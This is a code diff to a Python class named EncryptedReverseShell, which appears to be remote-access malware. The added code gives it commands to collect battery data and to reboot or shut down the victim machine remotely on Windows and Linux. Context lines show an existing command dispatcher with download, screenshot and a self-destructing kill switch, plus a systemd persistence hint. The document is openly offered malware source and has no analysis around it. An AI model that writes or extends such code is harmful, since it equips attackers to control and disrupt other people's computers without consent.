@@ -233,6 +233,87 @@ class EncryptedReverseShell:
         
         return info
 
+    def get_battery_info(self):
+        try:
+            if platform.system() != "Windows":
+                return {"error": "Battery info is only available on Windows"}
+            
+            battery = psutil.sensors_battery()
+            if battery is None:
+                return {"error": "No battery found"}
+
+            try:
+                result = subprocess.run(['wmic', 'path', 'Win32_Battery', 'get', 'BatteryStatus,EstimatedChargeRemaining,EstimatedRunTime,Status,Name'], 
+                                      capture_output=True, text=True, timeout=10)
+                wmi_info = result.stdout.strip()
+            except:
+                wmi_info = "WMI info not available"
+            
+            battery_info = {
+                "percent": battery.percent,
+                "power_plugged": battery.power_plugged,
+                "charging": battery.power_plugged,
+                "status": "Charging" if battery.power_plugged else "Discharging",
+                "seconds_left": battery.secsleft if battery.secsleft != -1 else "Unknown",
+                "time_left": str(datetime.timedelta(seconds=battery.secsleft)) if battery.secsleft > 0 else "Unknown",
+                "wmi_details": wmi_info
+            }
+            
+            return {"battery_info": battery_info}
+            
+        except Exception as e:
+            return {"error": f"Battery info failed: {str(e)}"}
+
+    def reboot_system(self):
+        try:
+            system = platform.system()
+            
+            if system == "Windows":
+                subprocess.run(['shutdown', '/r', '/t', '5', '/c', 'System reboot initiated'], 
+                             capture_output=True)
+                return {"output": "System will reboot in 5 seconds"}
+                
+            elif system == "Linux":
+                try:
+                    subprocess.run(['systemctl', 'reboot'], capture_output=True)
+                except:
+                    try:
+                        subprocess.run(['reboot'], capture_output=True)
+                    except:
+                        subprocess.run(['sudo', 'reboot'], capture_output=True)
+                
+                return {"output": "Reboot command sent"}
+            else:
+                return {"error": f"Unsupported platform: {system}"}
+                
+        except Exception as e:
+            return {"error": f"Reboot failed: {str(e)}"}
+
+    def shutdown_system(self):
+        try:
+            system = platform.system()
+            
+            if system == "Windows":
+                subprocess.run(['shutdown', '/s', '/t', '5', '/c', 'System shutdown initiated'], 
+                             capture_output=True)
+                return {"output": "System will shutdown in 5 seconds"}
+                
+            elif system == "Linux":
+                try:
+                    subprocess.run(['systemctl', 'poweroff'], capture_output=True)
+                except:
+                    try:
+                        subprocess.run(['shutdown', '-h', 'now'], capture_output=True)
+                    except:
+                        subprocess.run(['sudo', 'shutdown', '-h', 'now'], capture_output=True)
+                
+                return {"output": "Shutdown command sent"}
+            else:
+                return {"error": f"Unsupported platform: {system}"}
+                
+        except Exception as e:
+            return {"error": f"Shutdown failed: {str(e)}"}
+
     def take_screenshot(self):
         try:
             screenshot = ImageGrab.grab()
@@ -813,6 +894,15 @@ WantedBy=default.target
             
             elif cmd_type == "download":
                 return {"download_result": self.download_file(command)}
+            
+            elif cmd_type == "battery":
+                return {"battery_result": self.get_battery_info()}
+            
+            elif cmd_type == "reboot":
+                return {"reboot_result": self.reboot_system()}
+            
+            elif cmd_type == "shutdown":
+                return {"shutdown_result": self.shutdown_system()}
             
             elif cmd_type == "kill_switch":
                 def delayed_destruction():
